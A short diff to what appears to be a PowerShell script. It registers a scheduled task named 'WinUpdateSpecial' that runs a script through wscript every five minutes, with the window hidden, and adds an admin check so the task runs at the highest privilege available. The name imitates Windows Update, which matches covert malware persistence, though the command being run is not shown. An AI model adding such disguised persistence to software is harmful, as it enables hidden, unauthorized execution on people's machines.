@@ -42,9 +42,13 @@ returnValue = objShell.Run(command, 0, True)
 $batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii
 
 
-schtasks /Create /SC minute /MO 5 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'" /F /RL HIGHEST
 
+$isAdmin = ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
+# Decide privilege level
+$runLevel = if ($isAdmin) { "HIGHEST" } else { "LIMITED" }
 
-
+schtasks /Create /SC minute /MO 5 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'" /F /RL $runLevel
 
